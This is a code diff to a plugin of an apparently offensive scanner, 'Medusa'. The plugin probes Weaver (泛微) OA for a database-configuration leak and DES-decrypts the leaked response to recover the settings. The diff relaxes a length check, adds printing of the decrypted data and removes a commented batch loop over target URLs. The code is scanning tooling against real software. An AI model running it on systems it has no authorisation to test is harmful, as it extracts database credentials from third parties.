@@ -3,7 +3,7 @@
 
 __author__ = 'Ascotbe'
 __date__ = '2019/10/13 22:12 PM'
-import urllib
+import urllib.parse
 import requests
 import logging
 import ClassCongregation
@@ -30,7 +30,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-def medusa(Url,RandomAgent,ProxyIp):
+def medusa(Url,RandomAgent,ProxyIp=None):
 
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -65,10 +65,11 @@ def medusa(Url,RandomAgent,ProxyIp):
         dec=resp.content[10:]
         resph= resp.headers['Set-Cookie']
         code = resp.status_code
-        if code == 200 and resp.headers['Content-Type']=='text/html; charset=UTF-8' and resph.find('ecology') != -1 and len(con)>20:
+        if code == 200 and resp.headers['Content-Type']=='text/html; charset=UTF-8' and resph.find('ecology') != -1 :
             k = pyDes.des(key, pyDes.ECB, '\0' * 8, pad=None, padmode=pyDes.PAD_PKCS5)
             decs=k.decrypt(dec)
             Medusa = "{} 存在泛微OA_数据库配置信息泄露验证数据:\r\nUrl:{}\r\n返回数据:{}\r\n解密数据:{}".format(url,payload_url,con,decs)
+            print(Medusa)
             _t=VulnerabilityInfo(Medusa)
             web=ClassCongregation.VulnerabilityDetails(_t.info)
             web.Intermediate() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
@@ -77,9 +78,4 @@ def medusa(Url,RandomAgent,ProxyIp):
         _ = VulnerabilityInfo('').info.get('algroup')
         _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
 
-#
-# if __name__ == '__main__':
-#     with open(r'4.txt', 'r') as file:
-#        content_lists = file.readlines()
-#        url = [x.strip() for x in content_lists]
-#        for l in url:
+
